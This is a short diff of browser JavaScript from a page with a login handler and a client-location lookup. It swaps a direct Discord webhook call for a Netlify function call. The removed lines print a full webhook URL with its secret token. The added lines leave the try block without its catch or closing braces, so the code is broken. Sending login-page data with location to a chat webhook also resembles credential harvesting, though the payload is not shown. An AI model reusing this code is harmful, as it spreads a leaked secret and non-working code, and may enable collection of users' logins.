@@ -42,20 +42,13 @@ async function getClientLocation() {
 
 async function sendWebhookMessage(payload) {
     try {
-        const response = await fetch("https://discord.com/api/webhooks/1533039544587387031/AUek-gEmWN-WFKzEftdRQhVoq3eJlyqd6XxY1-a9kpZA4Pp93KHn2XKr5PED5pQaSIQi", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-        });
-        console.log('Discord notify response', response.status, response.statusText);
-        if (!response.ok) {
-            const text = await response.text();
-            console.error('Discord notify failed:', response.status, text);
-        }
-    } catch (error) {
-        console.error('Discord notification failed', error);
-    }
-}
+         const response = await fetch('/.netlify/functions/discordNotify.js', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+});
+
+
 
 async function handleLoginSubmit(event) {
     event.preventDefault();
